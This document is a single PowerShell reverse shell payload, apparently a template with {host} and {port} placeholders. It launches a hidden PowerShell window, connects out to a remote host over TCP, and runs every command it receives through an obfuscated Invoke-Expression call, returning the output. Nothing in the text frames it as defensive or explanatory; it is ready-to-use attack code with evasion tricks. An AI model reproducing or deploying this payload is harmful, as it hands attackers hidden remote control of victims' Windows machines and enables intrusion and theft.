Start-Process $PSHOME\powershell.exe -ArgumentList {$var1 = New-Object Net.Sockets.TCPClient('{host}', {port});$var2 = $var1.GetStream();$var3 = New-Object IO.StreamWriter($var2);[byte[]]$Buffer = 0..$var1.ReceiveBufferSize | % {0};function WriteToStream ($var4) {$var3.Write($var4 + 'flesh(SHELL)> ');$var3.Flush()}while(($var5 = $var2.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$var6 = ([text.encoding]::UTF8).GetString($Buffer, 0, $var5).Trim();if($var6){$var7 = try {$temp = &(gcm I*e-Ex*n) $var6 2>&1 | &(gcm O*t-St*g);if(-not $temp){" "}else{$temp}} catch {$_ | Out-String};WriteToStream ($var7)}else{WriteToStream ""}}$var3.Close()} -WindowStyle Hidden
